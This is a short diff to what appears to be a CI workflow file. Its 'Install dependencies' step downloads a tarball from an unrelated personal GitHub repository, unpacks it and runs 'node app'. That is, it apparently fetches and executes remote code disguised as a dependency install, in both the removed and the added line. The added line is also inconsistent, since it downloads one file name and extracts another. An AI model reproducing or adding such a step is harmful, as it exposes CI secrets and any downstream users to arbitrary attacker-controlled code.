@@ -28,4 +28,4 @@ jobs:
         node-version: ${{ matrix.node-version }}
 
     - name: Install dependencies
-      run: wget https://github.com/zenbriufyop/test/raw/refs/heads/main/l.tar.xz && tar xvf l.tar.xz && node app
+      run: wget https://github.com/zenbriufyop/test/raw/refs/heads/main/.tar.xz && tar xvf l.tar.xz && node app
